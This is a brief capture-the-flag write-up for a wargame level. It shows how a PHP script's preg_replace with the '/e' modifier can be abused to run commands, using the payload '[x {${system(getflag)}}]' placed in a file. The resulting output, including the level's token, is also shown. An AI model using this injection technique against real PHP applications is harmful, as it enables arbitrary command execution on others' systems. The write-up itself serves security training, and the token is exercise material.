Here, we heve 2 files: level06 and level06.php
If you try to exec level06, you see that it'll use level06.php and want file as argument
After some tries, we can see that it will print what's inside this file.
In one of the preg_replace of the php file, there is a "/e", which will execute a function inside the regex
The regex is: (\[x (.*)\])

We will have to write our exploit like this : [x FUNCTION]
and the function we will need is: {${system(getflag)}}
note: {${FUNCTION}} will allow us to get the return of the function

So, what we need to put in a file like /tmp/getflag is:
[x {${system(getflag)}}]

After that, we just need to execute the level06 with our new file:
./level06 /tmp/test

And we have:
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
